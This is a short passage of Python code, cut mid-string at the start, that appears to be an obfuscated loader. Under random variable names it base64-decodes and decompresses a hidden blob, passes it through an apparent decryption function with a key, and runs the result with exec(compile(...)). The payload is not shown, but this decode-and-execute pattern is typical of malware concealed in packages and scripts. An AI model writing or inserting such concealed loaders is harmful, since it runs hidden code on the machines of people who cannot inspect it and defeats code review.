lCq8agky4af/Jkh/ingqt60LCRqWU0xbYIG8EqVKGR0/gFkGhSN'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
